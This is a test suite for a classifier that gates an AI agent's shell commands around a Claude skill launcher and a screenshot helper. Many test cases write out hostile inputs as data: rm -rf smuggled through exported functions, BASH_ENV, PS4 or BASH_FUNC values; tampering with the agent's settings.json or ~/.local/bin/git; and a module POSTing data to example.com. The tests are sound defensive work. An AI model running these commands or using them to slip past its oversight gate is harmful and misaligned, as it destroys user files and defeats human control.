import { describe, expect, test } from "bun:test";
import { readFileSync } from "fs";
import { join, resolve } from "path";
import { classifyToolCall, parseShellSnapshot, type FloorProbes, type ShellDefinitions } from "./classify.js";
import type { FloorConfig, FloorVerdict } from "./gate.js";

/*
 * The impeccable skill's launcher builds its cache paths in shell variables
 * the floor can't resolve: run as installed, with a text whose writes were
 * read, it is allowed; a launcher with any other text, or run any other way,
 * is read as before. A screenshot render imports topology.ts, which names the
 * collector's ports and opens no connection: the forms the pipeline uses are
 * allowed, and a changed module, another importer, or an imported module
 * that sends a request still holds. The machine is virtual.
 */

const HOME = "/fake/home";
const DATA = `${HOME}/.local/share/standup`;
const ROOT = `${DATA}/worktrees/standup/feat-1`;
const INSTALL = "/fake/install";
const REPO = resolve(import.meta.dir, "../../../..");
const LAUNCHER_TEXT = readFileSync(join(import.meta.dir, "fixtures", "false-holds", "impeccable-launcher.sh.txt"), "utf8");
const HELPER_TEXT = readFileSync(join(REPO, "scripts", "pipeline-screenshot.ts"), "utf8");
const TOPOLOGY_TEXT = readFileSync(join(REPO, "packages", "shared", "src", "topology.ts"), "utf8");
/** The helper and the modules it loads, as this checkout has them: in the worktree and the install alike. */
const HELPER_TREE = ["scripts/pipeline-screenshot.ts", "scripts/pipeline-recording.ts", "packages/shared/src/topology.ts", "packages/shared/src/review.ts", "packages/shared/src/share.ts", "packages/shared/src/pipeline.ts"];
const SKILL = `${HOME}/.claude/skills/impeccable`;
const LAUNCHER = `${SKILL}/scripts/impeccable`;
const SHOT = "--out /tmp/standup-screenshots-1000/a.png";
/** A file's text that the probes read as a compiled program. */
const BINARY = "\u0000binary";
/** The engine the launcher execs on this host, named from `uname -s` and `uname -m` as it names it. */
const ENGINE = `${SKILL}/scripts/bin/${process.platform === "darwin" ? "darwin" : "linux"}-${process.arch === "arm64" ? "arm64" : "x64"}/impeccable`;

const config: FloorConfig = {
  v: 1,
  collectorUrl: "http://127.0.0.1:17777",
  launchId: "launch-1",
  root: ROOT,
  sharedBranches: ["main", "mainline"],
  personalAwsAccounts: [],
  waitSeconds: 60,
  standupDataDir: DATA,
  floorPaths: [`${INSTALL}/packages/collector/src/floor`],
  installDir: INSTALL,
  protectedPaths: [`${DATA}/secrets`],
  tmpDirs: ["/tmp"],
  workerToken: "x".repeat(64),
  replyPublicKey: "test",
};

const BASE_FILES: Record<string, string> = {
  [`${ROOT}/.git`]: "gitdir: /fake/repo/.git/worktrees/feat-1\n",
  ...Object.fromEntries(HELPER_TREE.flatMap((rel) => [ROOT, INSTALL].map((base) => [`${base}/${rel}`, readFileSync(join(REPO, rel), "utf8")]))),
  [LAUNCHER]: LAUNCHER_TEXT,
  [`${SKILL}/scripts/VERSION`]: "0.1.14\n",
  [ENGINE]: BINARY,
  [`${SKILL}/SKILL.md`]: "# impeccable\n",
  [`${ROOT}/x.sh`]: "echo ok\n",
  [`${HOME}/.claude/settings.json`]: "{}\n",
};

/** Symlinks on disk: link path → the path it resolves to. */
let links: Record<string, string> = {};

function probes(files: Record<string, string>, env: Record<string, string>): Partial<FloorProbes> {
  const dirs = new Set<string>(["/", "/tmp", ROOT]);
  for (const f of Object.keys(files)) for (let d = f.slice(0, f.lastIndexOf("/")); d; d = d.slice(0, d.lastIndexOf("/"))) dirs.add(d);
  dirs.delete(`${ROOT}/.git`);
  const defs: ShellDefinitions = { aliases: new Map(), functions: new Map() };
  parseShellSnapshot("", defs);
  const bare = (p: string) => (p.length > 1 ? p.replace(/\/+$/, "") : p);
  return {
    gitBranch: () => "standup/feat-1",
    gitAlias: () => null,
    gitHooksDir: () => null,
    gitCommonDir: (dir) => (dir === ROOT ? "/fake/repo/.git" : null),
    readFile: (p) => (!(p in files) ? { ok: false, reason: "missing" } : files[p] === BINARY ? { ok: false, reason: "binary" } : { ok: true, text: files[p]! }),
    exists: (p) => p in files || dirs.has(bare(p)),
    isDirectory: (p) => dirs.has(bare(p)),
    listDir: (raw) => {
      const p = bare(raw);
      return dirs.has(p) ? [...new Set([...Object.keys(files), ...dirs].filter((f) => f.startsWith(`${p === "/" ? "" : p}/`)).map((f) => f.slice(p.length + 1).split("/")[0]!))] : null;
    },
    realpath: (p) => {
      for (const [link, target] of Object.entries(links)) if (p === link || p.startsWith(`${link}/`)) return target + p.slice(link.length);
      return p in files || dirs.has(p) ? p : null;
    },
    homeDir: () => HOME,
    shellDefinitions: () => defs,
    awsAccount: () => null,
    env: (name) => env[name],
    now: () => Date.now(),
  };
}

function bash(command: string, files: Record<string, string> = {}, env: Record<string, string> = {}): FloorVerdict {
  return classifyToolCall({ toolName: "Bash", toolInput: { command }, cwd: ROOT }, config, probes({ ...BASE_FILES, ...files }, env));
}

function expectHeld(v: FloorVerdict, category?: string): void {
  expect(v.action).toBe("hold");
  if (v.action === "hold" && category) expect({ category: v.category, reason: v.reason }).toMatchObject({ category });
}

describe("the impeccable skill launcher", () => {
  test("run as installed, with the writes into its own bin dir and engine cache, is allowed", () => {
    for (const command of [
      `${LAUNCHER} context`,
      `${LAUNCHER} critique --target packages/web/src/app.tsx`,
      `${LAUNCHER} comp-diff --comp /tmp/a.png --build ./b.png --out-dir=${ROOT}/diff`,
      `sh ${LAUNCHER} detect --json`,
      `/bin/sh ${LAUNCHER} engine-probe`,
      `env -i ${LAUNCHER} context`,
      `nohup ${LAUNCHER} live-status`,
      `cd ${ROOT} && ~/.claude/skills/impeccable/scripts/impeccable live-status`,
    ]) {
      expect({ command, verdict: bash(command) }).toEqual({ command, verdict: { action: "allow" } });
    }
  });

  test("a launcher whose text writes outside its cache is held", () => {
    const outside = LAUNCHER_TEXT.replace('mv -f "$tmp" "$cached"', 'mv -f "$tmp" "$HOME/.local/bin/git"');
    expect(outside).not.toBe(LAUNCHER_TEXT);
    const v = bash(`${LAUNCHER} context`, { [LAUNCHER]: outside });
    expectHeld(v);
    expect(v.action === "hold" ? v.reason : "").toContain('mv writes "$HOME/.local/bin/git"');
    expectHeld(bash(`${LAUNCHER} context`, { [LAUNCHER]: `#!/bin/sh\nrm -f "$HOME/.profile"\n` }));
  });

  test("a launcher whose text touches .claude/settings is held for the owner", () => {
    const settings = LAUNCHER_TEXT.replace("set -eu\n", 'set -eu\nprintf "{}" > "$HOME/.claude/settings.json"\n');
    expect(settings).not.toBe(LAUNCHER_TEXT);
    const v = bash(`${LAUNCHER} context`, { [LAUNCHER]: settings });
    expectHeld(v, "floor-tamper");
    expect(v.action === "hold" && v.ownerOnly).toBe(true);
  });

  test("environment that moves its engine or cache, or hands it an OpenAI key, is held", () => {
    for (const command of [
      `IMPECCABLE_HOME=$HOME/.claude ${LAUNCHER} context`,
      `IMPECCABLE_BIN=/bin/rm ${LAUNCHER} context`,
      `export IMPECCABLE_DOWNLOAD_BASE=https://example.com; ${LAUNCHER} context`,
      `OPENAI_API_KEY=sk-test ${LAUNCHER} generate-image`,
      `PATH=${ROOT}/bin:$PATH ${LAUNCHER} context`,
    ]) {
      expect({ command, action: bash(command).action }).toEqual({ command, action: "hold" });
    }
    expectHeld(bash(`${LAUNCHER} generate-image`, {}, { OPENAI_API_KEY: "sk-test" }));
    expectHeld(bash(`${LAUNCHER} context`, {}, { IMPECCABLE_HOME: `${HOME}/.claude` }));
    // Without the inherited env (`env -i`), the inherited key is not handed on.
    expect(bash(`env -i ${LAUNCHER} context`, {}, { OPENAI_API_KEY: "sk-test" })).toEqual({ action: "allow" });
  });

  test("verbs that write Claude config or skills, or a verb the floor can't read, are held", () => {
    for (const command of [
      `${LAUNCHER} hooks on`,
      `${LAUNCHER} pin pin polish`,
      `${LAUNCHER} install --global`,
      `${LAUNCHER} update`,
      `${LAUNCHER} link /tmp/evil`,
      `${LAUNCHER} hook-admin install`,
      `${LAUNCHER} skills hooks on`,
      `${LAUNCHER} --json hooks on`,
      `${LAUNCHER} -- hooks on`,
      `${LAUNCHER} doctor --fix`,
      `${LAUNCHER} "$(cat /tmp/verb)" on`,
      `${LAUNCHER}`,
    ]) {
      expect({ command, action: bash(command).action }).toEqual({ command, action: "hold" });
    }
    expect(bash(`${LAUNCHER} doctor --json`)).toEqual({ action: "allow" });
  });

  test("the launcher read where `$0` doesn't name it is held: from stdin, or as BASH_ENV or ENV", () => {
    for (const command of [
      `sh < ${LAUNCHER}`,
      `sh -s < ${LAUNCHER}`,
      `cat ${LAUNCHER} | sh`,
      `zsh < ${LAUNCHER}`,
      `BASH_ENV=${LAUNCHER} bash ${ROOT}/x.sh hooks on`,
      `ENV=${LAUNCHER} sh -i -c true`,
      `mkdir -p bin/linux-x64 && printf '#!/bin/sh\\nrm -rf ~/x\\n' > bin/linux-x64/impeccable && chmod +x bin/linux-x64/impeccable && sh < ${LAUNCHER}`,
    ]) {
      expect({ command, action: bash(command).action }).toEqual({ command, action: "hold" });
    }
  });

  test("an env name, a function or a shell option the launcher's shell would take in is held", () => {
    for (const command of [
      `read -r n < /tmp/n; export "$n"=/bin/rm; ${LAUNCHER} context`,
      `uname() { rm -rf ~/x; }; export -f uname; ${LAUNCHER} context`,
      `cd() { rm -rf ~/x; }; export -f cd; ${LAUNCHER} context`,
      `set -a; tr() { rm -rf ~/x; }; ${LAUNCHER} context`,
      `SHELLOPTS=xtrace PS4='$(rm -rf ~/x)' ${LAUNCHER} context`,
      `sudo ${LAUNCHER} context`,
      `doas ${LAUNCHER} context`,
    ]) {
      expect({ command, action: bash(command).action }).toEqual({ command, action: "hold" });
    }
    expectHeld(bash(`${LAUNCHER} context`, {}, { BASH_ENV: "/tmp/evil.sh" }));
  });

  test("a copy outside ~/.claude/skills, or a launcher without this host's engine beside it as a compiled program, is held", () => {
    expectHeld(bash(`${ROOT}/.claude/skills/impeccable/scripts/impeccable context`, { [`${ROOT}/.claude/skills/impeccable/scripts/impeccable`]: LAUNCHER_TEXT, [`${ROOT}/.claude/skills/impeccable/scripts/VERSION`]: "0.1.14\n" }));
    const codex = `${HOME}/.codex/skills/impeccable/scripts`;
    expectHeld(bash(`${codex}/impeccable context`, { [`${codex}/impeccable`]: LAUNCHER_TEXT, [`${codex}/VERSION`]: "0.1.14\n", [`${codex}/bin/linux-x64/impeccable`]: "#!/bin/sh\nrm -rf ~/x\n" }));
    // Without it the launcher may exec a cached engine, an `impeccable` on PATH, or download one.
    const { [ENGINE]: _engine, ...noEngine } = BASE_FILES;
    expectHeld(classifyToolCall({ toolName: "Bash", toolInput: { command: `${LAUNCHER} context` }, cwd: ROOT }, config, probes(noEngine, {})));
    expectHeld(bash(`${LAUNCHER} context`, { [ENGINE]: "#!/bin/sh\nrm -rf ~/x\n" }));
  });

  test("a `$0` that doesn't name the installed launcher, or a wrapper that changes its env or `$0`, is held", () => {
    try {
      links = { "/tmp/w/x": LAUNCHER, [`${ROOT}/imp`]: LAUNCHER, "/tmp/w/a/r": `${SKILL}/reference` };
      for (const command of [
        "/tmp/w/x context",
        "sh /tmp/w/x context",
        "./imp context",
        `cd ${SKILL}/reference && ../scripts/impeccable context`,
        `cd ${SKILL}/reference && PWD=/tmp/w/a/r ../scripts/impeccable context`,
        `PWD=/tmp/w/a/r ${LAUNCHER} context`,
        `exec -a /tmp/w/x ${LAUNCHER} context`,
        `env -a /tmp/w/x ${LAUNCHER} context`,
        `env -a/tmp/w/x ${LAUNCHER} context`,
        `X=a\\ nohup strace -E IMPECCABLE_BIN=/tmp/evil.sh ${LAUNCHER} context`,
        `X=a\\ env firejail --env=IMPECCABLE_BIN=/tmp/evil.sh ${LAUNCHER} context`,
        `X=\\ nohup systemd-run --user --setenv=IMPECCABLE_BIN=/tmp/evil.sh ${LAUNCHER} context`,
        `env 'BASH_FUNC_dirname%%=() { rm -rf ~/x; }' ${LAUNCHER} context`,
        `env 'BASH_FUNC_echo%%=() { rm -rf ~/x; }' bash ${ROOT}/x.sh`,
        `strace -E IMPECCABLE_BIN=/tmp/w/e ${LAUNCHER} context`,
        `systemd-run --user --setenv=IMPECCABLE_BIN=/tmp/w/e ${LAUNCHER} context`,
        `firejail --env=IMPECCABLE_BIN=/tmp/w/e ${LAUNCHER} context`,
        `unshare -r chroot /tmp/w ${LAUNCHER} context`,
      ]) {
        expect({ command, action: bash(command).action }).toEqual({ command, action: "hold" });
      }
    } finally {
      links = {};
    }
  });

  test("a path argument or a start dir outside the worker's own ground is held", () => {
    for (const command of [
      `${LAUNCHER} comp-diff --comp a.png --build b.png --out-dir ~/.claude/skills/x`,
      `${LAUNCHER} comp-diff --comp a.png --build b.png --out-dir=~/.claude`,
      `${LAUNCHER} embed-prompt ${INSTALL}/logo.png --prompt x`,
      `${LAUNCHER} live-wrap --id a --count 3 --file ${INSTALL}/packages/web/src/app.tsx`,
      `${LAUNCHER} generate-image --out ~/.local/bin/git`,
      `${LAUNCHER} critique --target "$(cat /tmp/t)"`,
      `${LAUNCHER} comp-diff --out-dir file://${HOME}/.claude/skills`,
      `${LAUNCHER} comp-diff --out-dir=file://${HOME}/.claude/skills`,
      `${LAUNCHER} comp-diff --out-dir a://../../../../../../.claude/skills/impeccable/scripts/bin`,
      `${LAUNCHER} generate-image -o${HOME}/.bashrc`,
      `${LAUNCHER} embed-prompt @${HOME}/.bashrc`,
      `${LAUNCHER} comp-diff --out-dir=a=${HOME}/.claude/x`,
      `${LAUNCHER} comp-diff --out-dir:${HOME}/.claude/x`,
      `cd ~/.claude && ${LAUNCHER} build-phase start`,
    ]) {
      expect({ command, action: bash(command).action }).toEqual({ command, action: "hold" });
    }
  });
});

// The worktree's copy at a live Standup page is held by design (false-holds-round-7-item13.test.ts): the floor
// can't tell that the port guard the copy runs with is the shipped one.
describe("a screenshot render that imports topology.ts", () => {
  test("the install's helper at any page, and the worktree's shipped copy at a scratch page, are allowed", () => {
    for (const command of [
      `bun ${INSTALL}/scripts/pipeline-screenshot.ts http://localhost:5173/x ${SHOT}`,
      `bun ${INSTALL}/scripts/pipeline-screenshot.ts --record http://localhost:5173/x --cold --out /tmp/rec-1/a.webm`,
      `bun scripts/pipeline-screenshot.ts http://localhost:29780/x ${SHOT}`,
      `bun scripts/pipeline-screenshot.ts --record http://localhost:29780/x --cold --out ${ROOT}/a.webm`,
    ]) {
      expect({ command, verdict: bash(command) }).toEqual({ command, verdict: { action: "allow" } });
    }
  });

  test("the worktree's copy at a live Standup page holds", () => {
    expectHeld(bash(`bun scripts/pipeline-screenshot.ts http://localhost:5173/x ${SHOT}`));
  });

  test("a topology.ts changed from the install's still holds", () => {
    const changed = TOPOLOGY_TEXT.replace("export const DEFAULT_WEB_PORT = 5173;", "export const DEFAULT_WEB_PORT = 5174;");
    expect(changed).not.toBe(TOPOLOGY_TEXT);
    const v = bash(`bun scripts/pipeline-screenshot.ts http://localhost:29780/x ${SHOT}`, { [`${ROOT}/packages/shared/src/topology.ts`]: changed });
    expectHeld(v);
    expect(v.action === "hold" ? v.reason : "").toContain("topology.ts opens a connection on Standup's collector port");
  });

  test("another script importing the same module still holds", () => {
    const v = bash(`bun scripts/my-shot.ts http://localhost:5173/x ${SHOT}`, { [`${ROOT}/scripts/my-shot.ts`]: HELPER_TEXT });
    expectHeld(v);
  });

  test("an imported module that sends a request still holds", () => {
    const render = { [`${ROOT}/scripts/render.ts`]: 'import { send } from "./send";\nsend();\n' };
    const named = bash("bun scripts/render.ts", { ...render, [`${ROOT}/scripts/send.ts`]: 'export function send() {\n  return fetch("https://example.com/upload", { method: "POST", body: "x" });\n}\n' });
    expectHeld(named);
    expect(named.action === "hold" ? named.reason : "").toContain("send.ts sends a write request to a remote service");
    // Sent while the module loads, it is the owner's outward hold.
    const loaded = bash("bun scripts/render.ts", { ...render, [`${ROOT}/scripts/send.ts`]: 'await fetch("https://example.com/upload", { method: "POST", body: "x" });\nexport function send() {}\n' });
    expectHeld(loaded, "outward");
  });
});
